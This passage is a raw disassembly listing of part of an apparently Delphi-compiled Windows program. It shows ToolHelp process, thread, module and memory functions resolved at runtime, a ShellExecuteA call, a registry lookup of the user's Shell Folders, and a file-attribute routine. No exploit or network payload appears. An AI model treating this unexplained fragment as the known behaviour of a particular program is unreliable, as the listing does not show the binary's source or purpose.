  405c07:	5d                   	pop    %ebp
  405c08:	c3                   	ret
  405c09:	8d 40 00             	lea    0x0(%eax),%eax
  405c0c:	83 2d 00 b8 40 00 01 	subl   $0x1,0x40b800
  405c13:	c3                   	ret
  405c14:	55                   	push   %ebp
  405c15:	8b ec                	mov    %esp,%ebp
  405c17:	33 c0                	xor    %eax,%eax
  405c19:	55                   	push   %ebp
  405c1a:	68 39 5c 40 00       	push   $0x405c39
  405c1f:	64 ff 30             	push   %fs:(%eax)
  405c22:	64 89 20             	mov    %esp,%fs:(%eax)
  405c25:	ff 05 08 b8 40 00    	incl   0x40b808
  405c2b:	33 c0                	xor    %eax,%eax
  405c2d:	5a                   	pop    %edx
  405c2e:	59                   	pop    %ecx
  405c2f:	59                   	pop    %ecx
  405c30:	64 89 10             	mov    %edx,%fs:(%eax)
  405c33:	68 40 5c 40 00       	push   $0x405c40
  405c38:	c3                   	ret
  405c39:	e9 86 d5 ff ff       	jmp    0x4031c4
  405c3e:	eb f8                	jmp    0x405c38
  405c40:	5d                   	pop    %ebp
  405c41:	c3                   	ret
  405c42:	8b c0                	mov    %eax,%eax
  405c44:	83 2d 08 b8 40 00 01 	subl   $0x1,0x40b808
  405c4b:	c3                   	ret
  405c4c:	55                   	push   %ebp
  405c4d:	8b ec                	mov    %esp,%ebp
  405c4f:	33 c0                	xor    %eax,%eax
  405c51:	55                   	push   %ebp
  405c52:	68 71 5c 40 00       	push   $0x405c71
  405c57:	64 ff 30             	push   %fs:(%eax)
  405c5a:	64 89 20             	mov    %esp,%fs:(%eax)
  405c5d:	ff 05 0c b8 40 00    	incl   0x40b80c
  405c63:	33 c0                	xor    %eax,%eax
  405c65:	5a                   	pop    %edx
  405c66:	59                   	pop    %ecx
  405c67:	59                   	pop    %ecx
  405c68:	64 89 10             	mov    %edx,%fs:(%eax)
  405c6b:	68 78 5c 40 00       	push   $0x405c78
  405c70:	c3                   	ret
  405c71:	e9 4e d5 ff ff       	jmp    0x4031c4
  405c76:	eb f8                	jmp    0x405c70
  405c78:	5d                   	pop    %ebp
  405c79:	c3                   	ret
  405c7a:	8b c0                	mov    %eax,%eax
  405c7c:	83 2d 0c b8 40 00 01 	subl   $0x1,0x40b80c
  405c83:	c3                   	ret
  405c84:	55                   	push   %ebp
  405c85:	8b ec                	mov    %esp,%ebp
  405c87:	33 c0                	xor    %eax,%eax
  405c89:	55                   	push   %ebp
  405c8a:	68 a9 5c 40 00       	push   $0x405ca9
  405c8f:	64 ff 30             	push   %fs:(%eax)
  405c92:	64 89 20             	mov    %esp,%fs:(%eax)
  405c95:	ff 05 10 b8 40 00    	incl   0x40b810
  405c9b:	33 c0                	xor    %eax,%eax
  405c9d:	5a                   	pop    %edx
  405c9e:	59                   	pop    %ecx
  405c9f:	59                   	pop    %ecx
  405ca0:	64 89 10             	mov    %edx,%fs:(%eax)
  405ca3:	68 b0 5c 40 00       	push   $0x405cb0
  405ca8:	c3                   	ret
  405ca9:	e9 16 d5 ff ff       	jmp    0x4031c4
  405cae:	eb f8                	jmp    0x405ca8
  405cb0:	5d                   	pop    %ebp
  405cb1:	c3                   	ret
  405cb2:	8b c0                	mov    %eax,%eax
  405cb4:	83 2d 10 b8 40 00 01 	subl   $0x1,0x40b810
  405cbb:	c3                   	ret
  405cbc:	53                   	push   %ebx
  405cbd:	bb 18 b8 40 00       	mov    $0x40b818,%ebx
  405cc2:	83 3b 00             	cmpl   $0x0,(%ebx)
  405cc5:	0f 85 35 01 00 00    	jne    0x405e00
  405ccb:	68 18 5e 40 00       	push   $0x405e18
  405cd0:	e8 1b ef ff ff       	call   0x404bf0
  405cd5:	89 03                	mov    %eax,(%ebx)
  405cd7:	83 3b 00             	cmpl   $0x0,(%ebx)
  405cda:	0f 84 20 01 00 00    	je     0x405e00
  405ce0:	68 28 5e 40 00       	push   $0x405e28
  405ce5:	8b 03                	mov    (%ebx),%eax
  405ce7:	50                   	push   %eax
  405ce8:	e8 0b ef ff ff       	call   0x404bf8
  405ced:	a3 1c b8 40 00       	mov    %eax,0x40b81c
  405cf2:	68 44 5e 40 00       	push   $0x405e44
  405cf7:	8b 03                	mov    (%ebx),%eax
  405cf9:	50                   	push   %eax
  405cfa:	e8 f9 ee ff ff       	call   0x404bf8
  405cff:	a3 20 b8 40 00       	mov    %eax,0x40b820
  405d04:	68 54 5e 40 00       	push   $0x405e54
  405d09:	8b 03                	mov    (%ebx),%eax
  405d0b:	50                   	push   %eax
  405d0c:	e8 e7 ee ff ff       	call   0x404bf8
  405d11:	a3 24 b8 40 00       	mov    %eax,0x40b824
  405d16:	68 64 5e 40 00       	push   $0x405e64
  405d1b:	8b 03                	mov    (%ebx),%eax
  405d1d:	50                   	push   %eax
  405d1e:	e8 d5 ee ff ff       	call   0x404bf8
  405d23:	a3 28 b8 40 00       	mov    %eax,0x40b828
  405d28:	68 70 5e 40 00       	push   $0x405e70
  405d2d:	8b 03                	mov    (%ebx),%eax
  405d2f:	50                   	push   %eax
  405d30:	e8 c3 ee ff ff       	call   0x404bf8
  405d35:	a3 2c b8 40 00       	mov    %eax,0x40b82c
  405d3a:	68 7c 5e 40 00       	push   $0x405e7c
  405d3f:	8b 03                	mov    (%ebx),%eax
  405d41:	50                   	push   %eax
  405d42:	e8 b1 ee ff ff       	call   0x404bf8
  405d47:	a3 30 b8 40 00       	mov    %eax,0x40b830
  405d4c:	68 98 5e 40 00       	push   $0x405e98
  405d51:	8b 03                	mov    (%ebx),%eax
  405d53:	50                   	push   %eax
  405d54:	e8 9f ee ff ff       	call   0x404bf8
  405d59:	a3 34 b8 40 00       	mov    %eax,0x40b834
  405d5e:	68 a8 5e 40 00       	push   $0x405ea8
  405d63:	8b 03                	mov    (%ebx),%eax
  405d65:	50                   	push   %eax
  405d66:	e8 8d ee ff ff       	call   0x404bf8
  405d6b:	a3 38 b8 40 00       	mov    %eax,0x40b838
  405d70:	68 b8 5e 40 00       	push   $0x405eb8
  405d75:	8b 03                	mov    (%ebx),%eax
  405d77:	50                   	push   %eax
  405d78:	e8 7b ee ff ff       	call   0x404bf8
  405d7d:	a3 3c b8 40 00       	mov    %eax,0x40b83c
  405d82:	68 c8 5e 40 00       	push   $0x405ec8
  405d87:	8b 03                	mov    (%ebx),%eax
  405d89:	50                   	push   %eax
  405d8a:	e8 69 ee ff ff       	call   0x404bf8
  405d8f:	a3 40 b8 40 00       	mov    %eax,0x40b840
  405d94:	68 d8 5e 40 00       	push   $0x405ed8
  405d99:	8b 03                	mov    (%ebx),%eax
  405d9b:	50                   	push   %eax
  405d9c:	e8 57 ee ff ff       	call   0x404bf8
  405da1:	a3 44 b8 40 00       	mov    %eax,0x40b844
  405da6:	68 e8 5e 40 00       	push   $0x405ee8
  405dab:	8b 03                	mov    (%ebx),%eax
  405dad:	50                   	push   %eax
  405dae:	e8 45 ee ff ff       	call   0x404bf8
  405db3:	a3 48 b8 40 00       	mov    %eax,0x40b848
  405db8:	68 f8 5e 40 00       	push   $0x405ef8
  405dbd:	8b 03                	mov    (%ebx),%eax
  405dbf:	50                   	push   %eax
  405dc0:	e8 33 ee ff ff       	call   0x404bf8
  405dc5:	a3 4c b8 40 00       	mov    %eax,0x40b84c
  405dca:	68 08 5f 40 00       	push   $0x405f08
  405dcf:	8b 03                	mov    (%ebx),%eax
  405dd1:	50                   	push   %eax
  405dd2:	e8 21 ee ff ff       	call   0x404bf8
  405dd7:	a3 50 b8 40 00       	mov    %eax,0x40b850
  405ddc:	68 18 5f 40 00       	push   $0x405f18
  405de1:	8b 03                	mov    (%ebx),%eax
  405de3:	50                   	push   %eax
  405de4:	e8 0f ee ff ff       	call   0x404bf8
  405de9:	a3 54 b8 40 00       	mov    %eax,0x40b854
  405dee:	68 28 5f 40 00       	push   $0x405f28
  405df3:	8b 03                	mov    (%ebx),%eax
  405df5:	50                   	push   %eax
  405df6:	e8 fd ed ff ff       	call   0x404bf8
  405dfb:	a3 58 b8 40 00       	mov    %eax,0x40b858
  405e00:	83 3b 00             	cmpl   $0x0,(%ebx)
  405e03:	74 09                	je     0x405e0e
  405e05:	83 3d 1c b8 40 00 00 	cmpl   $0x0,0x40b81c
  405e0c:	75 04                	jne    0x405e12
  405e0e:	33 c0                	xor    %eax,%eax
  405e10:	5b                   	pop    %ebx
  405e11:	c3                   	ret
  405e12:	b0 01                	mov    $0x1,%al
  405e14:	5b                   	pop    %ebx
  405e15:	c3                   	ret
  405e16:	00 00                	add    %al,(%eax)
  405e18:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  405e1c:	65 6c                	gs insb (%dx),%es:(%edi)
  405e1e:	33 32                	xor    (%edx),%esi
  405e20:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  405e23:	6c                   	insb   (%dx),%es:(%edi)
  405e24:	00 00                	add    %al,(%eax)
  405e26:	00 00                	add    %al,(%eax)
  405e28:	43                   	inc    %ebx
  405e29:	72 65                	jb     0x405e90
  405e2b:	61                   	popa
  405e2c:	74 65                	je     0x405e93
  405e2e:	54                   	push   %esp
  405e2f:	6f                   	outsl  %ds:(%esi),(%dx)
  405e30:	6f                   	outsl  %ds:(%esi),(%dx)
  405e31:	6c                   	insb   (%dx),%es:(%edi)
  405e32:	68 65 6c 70 33       	push   $0x33706c65
  405e37:	32 53 6e             	xor    0x6e(%ebx),%dl
  405e3a:	61                   	popa
  405e3b:	70 73                	jo     0x405eb0
  405e3d:	68 6f 74 00 00       	push   $0x746f
  405e42:	00 00                	add    %al,(%eax)
  405e44:	48                   	dec    %eax
  405e45:	65 61                	gs popa
  405e47:	70 33                	jo     0x405e7c
  405e49:	32 4c 69 73          	xor    0x73(%ecx,%ebp,2),%cl
  405e4d:	74 46                	je     0x405e95
  405e4f:	69 72 73 74 00 48 65 	imul   $0x65480074,0x73(%edx),%esi
  405e56:	61                   	popa
  405e57:	70 33                	jo     0x405e8c
  405e59:	32 4c 69 73          	xor    0x73(%ecx,%ebp,2),%cl
  405e5d:	74 4e                	je     0x405ead
  405e5f:	65 78 74             	gs js  0x405ed6
  405e62:	00 00                	add    %al,(%eax)
  405e64:	48                   	dec    %eax
  405e65:	65 61                	gs popa
  405e67:	70 33                	jo     0x405e9c
  405e69:	32 46 69             	xor    0x69(%esi),%al
  405e6c:	72 73                	jb     0x405ee1
  405e6e:	74 00                	je     0x405e70
  405e70:	48                   	dec    %eax
  405e71:	65 61                	gs popa
  405e73:	70 33                	jo     0x405ea8
  405e75:	32 4e 65             	xor    0x65(%esi),%cl
  405e78:	78 74                	js     0x405eee
  405e7a:	00 00                	add    %al,(%eax)
  405e7c:	54                   	push   %esp
  405e7d:	6f                   	outsl  %ds:(%esi),(%dx)
  405e7e:	6f                   	outsl  %ds:(%esi),(%dx)
  405e7f:	6c                   	insb   (%dx),%es:(%edi)
  405e80:	68 65 6c 70 33       	push   $0x33706c65
  405e85:	32 52 65             	xor    0x65(%edx),%dl
  405e88:	61                   	popa
  405e89:	64 50                	fs push %eax
  405e8b:	72 6f                	jb     0x405efc
  405e8d:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e90:	73 4d                	jae    0x405edf
  405e92:	65 6d                	gs insl (%dx),%es:(%edi)
  405e94:	6f                   	outsl  %ds:(%esi),(%dx)
  405e95:	72 79                	jb     0x405f10
  405e97:	00 50 72             	add    %dl,0x72(%eax)
  405e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e9b:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e9e:	73 33                	jae    0x405ed3
  405ea0:	32 46 69             	xor    0x69(%esi),%al
  405ea3:	72 73                	jb     0x405f18
  405ea5:	74 00                	je     0x405ea7
  405ea7:	00 50 72             	add    %dl,0x72(%eax)
  405eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  405eab:	63 65 73             	arpl   %esp,0x73(%ebp)
  405eae:	73 33                	jae    0x405ee3
  405eb0:	32 4e 65             	xor    0x65(%esi),%cl
  405eb3:	78 74                	js     0x405f29
  405eb5:	00 00                	add    %al,(%eax)
  405eb7:	00 50 72             	add    %dl,0x72(%eax)
  405eba:	6f                   	outsl  %ds:(%esi),(%dx)
  405ebb:	63 65 73             	arpl   %esp,0x73(%ebp)
  405ebe:	73 33                	jae    0x405ef3
  405ec0:	32 46 69             	xor    0x69(%esi),%al
  405ec3:	72 73                	jb     0x405f38
  405ec5:	74 57                	je     0x405f1e
  405ec7:	00 50 72             	add    %dl,0x72(%eax)
  405eca:	6f                   	outsl  %ds:(%esi),(%dx)
  405ecb:	63 65 73             	arpl   %esp,0x73(%ebp)
  405ece:	73 33                	jae    0x405f03
  405ed0:	32 4e 65             	xor    0x65(%esi),%cl
  405ed3:	78 74                	js     0x405f49
  405ed5:	57                   	push   %edi
  405ed6:	00 00                	add    %al,(%eax)
  405ed8:	54                   	push   %esp
  405ed9:	68 72 65 61 64       	push   $0x64616572
  405ede:	33 32                	xor    (%edx),%esi
  405ee0:	46                   	inc    %esi
  405ee1:	69 72 73 74 00 00 00 	imul   $0x74,0x73(%edx),%esi
  405ee8:	54                   	push   %esp
  405ee9:	68 72 65 61 64       	push   $0x64616572
  405eee:	33 32                	xor    (%edx),%esi
  405ef0:	4e                   	dec    %esi
  405ef1:	65 78 74             	gs js  0x405f68
  405ef4:	00 00                	add    %al,(%eax)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	4d                   	dec    %ebp
  405ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  405efa:	64 75 6c             	fs jne 0x405f69
  405efd:	65 33 32             	xor    %gs:(%edx),%esi
  405f00:	46                   	inc    %esi
  405f01:	69 72 73 74 00 00 00 	imul   $0x74,0x73(%edx),%esi
  405f08:	4d                   	dec    %ebp
  405f09:	6f                   	outsl  %ds:(%esi),(%dx)
  405f0a:	64 75 6c             	fs jne 0x405f79
  405f0d:	65 33 32             	xor    %gs:(%edx),%esi
  405f10:	4e                   	dec    %esi
  405f11:	65 78 74             	gs js  0x405f88
  405f14:	00 00                	add    %al,(%eax)
  405f16:	00 00                	add    %al,(%eax)
  405f18:	4d                   	dec    %ebp
  405f19:	6f                   	outsl  %ds:(%esi),(%dx)
  405f1a:	64 75 6c             	fs jne 0x405f89
  405f1d:	65 33 32             	xor    %gs:(%edx),%esi
  405f20:	46                   	inc    %esi
  405f21:	69 72 73 74 57 00 00 	imul   $0x5774,0x73(%edx),%esi
  405f28:	4d                   	dec    %ebp
  405f29:	6f                   	outsl  %ds:(%esi),(%dx)
  405f2a:	64 75 6c             	fs jne 0x405f99
  405f2d:	65 33 32             	xor    %gs:(%edx),%esi
  405f30:	4e                   	dec    %esi
  405f31:	65 78 74             	gs js  0x405fa8
  405f34:	57                   	push   %edi
  405f35:	00 00                	add    %al,(%eax)
  405f37:	00 53 56             	add    %dl,0x56(%ebx)
  405f3a:	8b f2                	mov    %edx,%esi
  405f3c:	8b d8                	mov    %eax,%ebx
  405f3e:	e8 79 fd ff ff       	call   0x405cbc
  405f43:	84 c0                	test   %al,%al
  405f45:	74 0b                	je     0x405f52
  405f47:	56                   	push   %esi
  405f48:	53                   	push   %ebx
  405f49:	ff 15 1c b8 40 00    	call   *0x40b81c
  405f4f:	5e                   	pop    %esi
  405f50:	5b                   	pop    %ebx
  405f51:	c3                   	ret
  405f52:	33 c0                	xor    %eax,%eax
  405f54:	5e                   	pop    %esi
  405f55:	5b                   	pop    %ebx
  405f56:	c3                   	ret
  405f57:	90                   	nop
  405f58:	53                   	push   %ebx
  405f59:	56                   	push   %esi
  405f5a:	8b f2                	mov    %edx,%esi
  405f5c:	8b d8                	mov    %eax,%ebx
  405f5e:	e8 59 fd ff ff       	call   0x405cbc
  405f63:	84 c0                	test   %al,%al
  405f65:	74 0b                	je     0x405f72
  405f67:	56                   	push   %esi
  405f68:	53                   	push   %ebx
  405f69:	ff 15 34 b8 40 00    	call   *0x40b834
  405f6f:	5e                   	pop    %esi
  405f70:	5b                   	pop    %ebx
  405f71:	c3                   	ret
  405f72:	33 c0                	xor    %eax,%eax
  405f74:	5e                   	pop    %esi
  405f75:	5b                   	pop    %ebx
  405f76:	c3                   	ret
  405f77:	90                   	nop
  405f78:	53                   	push   %ebx
  405f79:	56                   	push   %esi
  405f7a:	8b f2                	mov    %edx,%esi
  405f7c:	8b d8                	mov    %eax,%ebx
  405f7e:	e8 39 fd ff ff       	call   0x405cbc
  405f83:	84 c0                	test   %al,%al
  405f85:	74 0b                	je     0x405f92
  405f87:	56                   	push   %esi
  405f88:	53                   	push   %ebx
  405f89:	ff 15 38 b8 40 00    	call   *0x40b838
  405f8f:	5e                   	pop    %esi
  405f90:	5b                   	pop    %ebx
  405f91:	c3                   	ret
  405f92:	33 c0                	xor    %eax,%eax
  405f94:	5e                   	pop    %esi
  405f95:	5b                   	pop    %ebx
  405f96:	c3                   	ret
  405f97:	90                   	nop
  405f98:	55                   	push   %ebp
  405f99:	8b ec                	mov    %esp,%ebp
  405f9b:	33 c0                	xor    %eax,%eax
  405f9d:	55                   	push   %ebp
  405f9e:	68 bd 5f 40 00       	push   $0x405fbd
  405fa3:	64 ff 30             	push   %fs:(%eax)
  405fa6:	64 89 20             	mov    %esp,%fs:(%eax)
  405fa9:	ff 05 14 b8 40 00    	incl   0x40b814
  405faf:	33 c0                	xor    %eax,%eax
  405fb1:	5a                   	pop    %edx
  405fb2:	59                   	pop    %ecx
  405fb3:	59                   	pop    %ecx
  405fb4:	64 89 10             	mov    %edx,%fs:(%eax)
  405fb7:	68 c4 5f 40 00       	push   $0x405fc4
  405fbc:	c3                   	ret
  405fbd:	e9 02 d2 ff ff       	jmp    0x4031c4
  405fc2:	eb f8                	jmp    0x405fbc
  405fc4:	5d                   	pop    %ebp
  405fc5:	c3                   	ret
  405fc6:	8b c0                	mov    %eax,%eax
  405fc8:	83 2d 14 b8 40 00 01 	subl   $0x1,0x40b814
  405fcf:	c3                   	ret
  405fd0:	55                   	push   %ebp
  405fd1:	8b ec                	mov    %esp,%ebp
  405fd3:	33 c0                	xor    %eax,%eax
  405fd5:	55                   	push   %ebp
  405fd6:	68 f5 5f 40 00       	push   $0x405ff5
  405fdb:	64 ff 30             	push   %fs:(%eax)
  405fde:	64 89 20             	mov    %esp,%fs:(%eax)
  405fe1:	ff 05 5c b8 40 00    	incl   0x40b85c
  405fe7:	33 c0                	xor    %eax,%eax
  405fe9:	5a                   	pop    %edx
  405fea:	59                   	pop    %ecx
  405feb:	59                   	pop    %ecx
  405fec:	64 89 10             	mov    %edx,%fs:(%eax)
  405fef:	68 fc 5f 40 00       	push   $0x405ffc
  405ff4:	c3                   	ret
  405ff5:	e9 ca d1 ff ff       	jmp    0x4031c4
  405ffa:	eb f8                	jmp    0x405ff4
  405ffc:	5d                   	pop    %ebp
  405ffd:	c3                   	ret
  405ffe:	8b c0                	mov    %eax,%eax
  406000:	83 2d 5c b8 40 00 01 	subl   $0x1,0x40b85c
  406007:	c3                   	ret
  406008:	55                   	push   %ebp
  406009:	8b ec                	mov    %esp,%ebp
  40600b:	83 c4 f8             	add    $0xfffffff8,%esp
  40600e:	53                   	push   %ebx
  40600f:	56                   	push   %esi
  406010:	57                   	push   %edi
  406011:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406014:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406017:	e8 98 da ff ff       	call   0x403ab4
  40601c:	33 c0                	xor    %eax,%eax
  40601e:	55                   	push   %ebp
  40601f:	68 a7 60 40 00       	push   $0x4060a7
  406024:	64 ff 30             	push   %fs:(%eax)
  406027:	64 89 20             	mov    %esp,%fs:(%eax)
  40602a:	c6 45 fb 00          	movb   $0x0,-0x5(%ebp)
  40602e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406031:	e8 0e 03 00 00       	call   0x406344
  406036:	84 c0                	test   %al,%al
  406038:	74 57                	je     0x406091
  40603a:	33 c0                	xor    %eax,%eax
  40603c:	55                   	push   %ebp
  40603d:	68 87 60 40 00       	push   $0x406087
  406042:	64 ff 30             	push   %fs:(%eax)
  406045:	64 89 20             	mov    %esp,%fs:(%eax)
  406048:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40604b:	e8 74 da ff ff       	call   0x403ac4
  406050:	8b f0                	mov    %eax,%esi
  406052:	56                   	push   %esi
  406053:	e8 88 eb ff ff       	call   0x404be0
  406058:	8b d8                	mov    %eax,%ebx
  40605a:	80 e3 02             	and    $0x2,%bl
  40605d:	80 e3 01             	and    $0x1,%bl
  406060:	80 e3 04             	and    $0x4,%bl
  406063:	33 c0                	xor    %eax,%eax
  406065:	8a c3                	mov    %bl,%al
  406067:	50                   	push   %eax
  406068:	56                   	push   %esi
  406069:	e8 c2 eb ff ff       	call   0x404c30
  40606e:	56                   	push   %esi
  40606f:	e8 34 eb ff ff       	call   0x404ba8
  406074:	83 f8 01             	cmp    $0x1,%eax
  406077:	1b c0                	sbb    %eax,%eax
  406079:	40                   	inc    %eax
  40607a:	88 45 fb             	mov    %al,-0x5(%ebp)
  40607d:	33 c0                	xor    %eax,%eax
  40607f:	5a                   	pop    %edx
  406080:	59                   	pop    %ecx
  406081:	59                   	pop    %ecx
  406082:	64 89 10             	mov    %edx,%fs:(%eax)
  406085:	eb 0a                	jmp    0x406091
  406087:	e9 0c d0 ff ff       	jmp    0x403098
  40608c:	e8 bf d1 ff ff       	call   0x403250
  406091:	33 c0                	xor    %eax,%eax
  406093:	5a                   	pop    %edx
  406094:	59                   	pop    %ecx
  406095:	59                   	pop    %ecx
  406096:	64 89 10             	mov    %edx,%fs:(%eax)
  406099:	68 ae 60 40 00       	push   $0x4060ae
  40609e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4060a1:	e8 aa d6 ff ff       	call   0x403750
  4060a6:	c3                   	ret
  4060a7:	e9 18 d1 ff ff       	jmp    0x4031c4
  4060ac:	eb f0                	jmp    0x40609e
  4060ae:	8a 45 fb             	mov    -0x5(%ebp),%al
  4060b1:	5f                   	pop    %edi
  4060b2:	5e                   	pop    %esi
  4060b3:	5b                   	pop    %ebx
  4060b4:	59                   	pop    %ecx
  4060b5:	59                   	pop    %ecx
  4060b6:	5d                   	pop    %ebp
  4060b7:	c3                   	ret
  4060b8:	55                   	push   %ebp
  4060b9:	8b ec                	mov    %esp,%ebp
  4060bb:	53                   	push   %ebx
  4060bc:	56                   	push   %esi
  4060bd:	57                   	push   %edi
  4060be:	8b f9                	mov    %ecx,%edi
  4060c0:	8b f2                	mov    %edx,%esi
  4060c2:	8b d8                	mov    %eax,%ebx
  4060c4:	68 f4 60 40 00       	push   $0x4060f4
  4060c9:	68 04 61 40 00       	push   $0x406104
  4060ce:	e8 35 eb ff ff       	call   0x404c08
  4060d3:	50                   	push   %eax
  4060d4:	e8 1f eb ff ff       	call   0x404bf8
  4060d9:	8b 55 08             	mov    0x8(%ebp),%edx
  4060dc:	52                   	push   %edx
  4060dd:	8b 55 0c             	mov    0xc(%ebp),%edx
  4060e0:	52                   	push   %edx
  4060e1:	8b 55 10             	mov    0x10(%ebp),%edx
  4060e4:	52                   	push   %edx
  4060e5:	57                   	push   %edi
  4060e6:	56                   	push   %esi
  4060e7:	53                   	push   %ebx
  4060e8:	ff d0                	call   *%eax
  4060ea:	5f                   	pop    %edi
  4060eb:	5e                   	pop    %esi
  4060ec:	5b                   	pop    %ebx
  4060ed:	5d                   	pop    %ebp
  4060ee:	c2 0c 00             	ret    $0xc
  4060f1:	00 00                	add    %al,(%eax)
  4060f3:	00 53 68             	add    %dl,0x68(%ebx)
  4060f6:	65 6c                	gs insb (%dx),%es:(%edi)
  4060f8:	6c                   	insb   (%dx),%es:(%edi)
  4060f9:	45                   	inc    %ebp
  4060fa:	78 65                	js     0x406161
  4060fc:	63 75 74             	arpl   %esi,0x74(%ebp)
  4060ff:	65 41                	gs inc %ecx
  406101:	00 00                	add    %al,(%eax)
  406103:	00 73 68             	add    %dh,0x68(%ebx)
  406106:	65 6c                	gs insb (%dx),%es:(%edi)
  406108:	6c                   	insb   (%dx),%es:(%edi)
  406109:	33 32                	xor    (%edx),%esi
  40610b:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40610e:	6c                   	insb   (%dx),%es:(%edi)
  40610f:	00 55 8b             	add    %dl,-0x75(%ebp)
  406112:	ec                   	in     (%dx),%al
  406113:	6a 00                	push   $0x0
  406115:	6a 00                	push   $0x0
  406117:	53                   	push   %ebx
  406118:	56                   	push   %esi
  406119:	8b f2                	mov    %edx,%esi
  40611b:	8b d8                	mov    %eax,%ebx
  40611d:	33 c0                	xor    %eax,%eax
  40611f:	55                   	push   %ebp
  406120:	68 70 61 40 00       	push   $0x406170
  406125:	64 ff 30             	push   %fs:(%eax)
  406128:	64 89 20             	mov    %esp,%fs:(%eax)
  40612b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40612e:	ba 88 61 40 00       	mov    $0x406188,%edx
  406133:	e8 b0 d6 ff ff       	call   0x4037e8
  406138:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40613b:	8b d3                	mov    %ebx,%edx
  40613d:	e8 a6 d6 ff ff       	call   0x4037e8
  406142:	6a 00                	push   $0x0
  406144:	56                   	push   %esi
  406145:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406148:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40614b:	b8 01 00 00 80       	mov    $0x80000001,%eax
  406150:	e8 73 05 00 00       	call   0x4066c8
  406155:	33 c0                	xor    %eax,%eax
  406157:	5a                   	pop    %edx
  406158:	59                   	pop    %ecx
  406159:	59                   	pop    %ecx
  40615a:	64 89 10             	mov    %edx,%fs:(%eax)
  40615d:	68 77 61 40 00       	push   $0x406177
  406162:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406165:	ba 02 00 00 00       	mov    $0x2,%edx
  40616a:	e8 05 d6 ff ff       	call   0x403774
  40616f:	c3                   	ret
  406170:	e9 4f d0 ff ff       	jmp    0x4031c4
  406175:	eb eb                	jmp    0x406162
  406177:	5e                   	pop    %esi
  406178:	5b                   	pop    %ebx
  406179:	59                   	pop    %ecx
  40617a:	59                   	pop    %ecx
  40617b:	5d                   	pop    %ebp
  40617c:	c3                   	ret
  40617d:	00 00                	add    %al,(%eax)
  40617f:	00 ff                	add    %bh,%bh
  406181:	ff                   	(bad)
  406182:	ff                   	(bad)
  406183:	ff 40 00             	incl   0x0(%eax)
  406186:	00 00                	add    %al,(%eax)
  406188:	53                   	push   %ebx
  406189:	4f                   	dec    %edi
  40618a:	46                   	inc    %esi
  40618b:	54                   	push   %esp
  40618c:	57                   	push   %edi
  40618d:	41                   	inc    %ecx
  40618e:	52                   	push   %edx
  40618f:	45                   	inc    %ebp
  406190:	5c                   	pop    %esp
  406191:	4d                   	dec    %ebp
  406192:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406199:	74 5c                	je     0x4061f7
  40619b:	57                   	push   %edi
  40619c:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  4061a3:	43                   	inc    %ebx
  4061a4:	75 72                	jne    0x406218
  4061a6:	72 65                	jb     0x40620d
  4061a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4061a9:	74 56                	je     0x406201
  4061ab:	65 72 73             	gs jb  0x406221
  4061ae:	69 6f 6e 5c 45 78 70 	imul   $0x7078455c,0x6e(%edi),%ebp
  4061b5:	6c                   	insb   (%dx),%es:(%edi)
  4061b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4061b7:	72 65                	jb     0x40621e
  4061b9:	72 5c                	jb     0x406217
  4061bb:	53                   	push   %ebx
  4061bc:	68 65 6c 6c 20       	push   $0x206c6c65
  4061c1:	46                   	inc    %esi
  4061c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4061c3:	6c                   	insb   (%dx),%es:(%edi)
  4061c4:	64 65 72 73          	fs gs jb 0x40623b
  4061c8:	00 00                	add    %al,(%eax)
  4061ca:	00 00                	add    %al,(%eax)
  4061cc:	55                   	push   %ebp
  4061cd:	8b ec                	mov    %esp,%ebp
  4061cf:	6a 00                	push   $0x0
  4061d1:	53                   	push   %ebx
  4061d2:	8b d8                	mov    %eax,%ebx
  4061d4:	33 c0                	xor    %eax,%eax
  4061d6:	55                   	push   %ebp
  4061d7:	68 0f 62 40 00       	push   $0x40620f
  4061dc:	64 ff 30             	push   %fs:(%eax)
  4061df:	64 89 20             	mov    %esp,%fs:(%eax)
  4061e2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4061e5:	ba 24 62 40 00       	mov    $0x406224,%edx
  4061ea:	e8 f9 d5 ff ff       	call   0x4037e8
  4061ef:	8b d3                	mov    %ebx,%edx
  4061f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4061f4:	e8 17 ff ff ff       	call   0x406110
  4061f9:	33 c0                	xor    %eax,%eax
  4061fb:	5a                   	pop    %edx
  4061fc:	59                   	pop    %ecx
  4061fd:	59                   	pop    %ecx
  4061fe:	64 89 10             	mov    %edx,%fs:(%eax)
  406201:	68 16 62 40 00       	push   $0x406216
  406206:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406209:	e8 42 d5 ff ff       	call   0x403750
  40620e:	c3                   	ret
  40620f:	e9 b0 cf ff ff       	jmp    0x4031c4
  406214:	eb f0                	jmp    0x406206
  406216:	5b                   	pop    %ebx
  406217:	59                   	pop    %ecx
  406218:	5d                   	pop    %ebp
  406219:	c3                   	ret
  40621a:	00 00                	add    %al,(%eax)
  40621c:	ff                   	(bad)
  40621d:	ff                   	(bad)
  40621e:	ff                   	(bad)
  40621f:	ff 07                	incl   (%edi)
  406221:	00 00                	add    %al,(%eax)
  406223:	00 41 70             	add    %al,0x70(%ecx)
  406226:	70 44                	jo     0x40626c
  406228:	61                   	popa
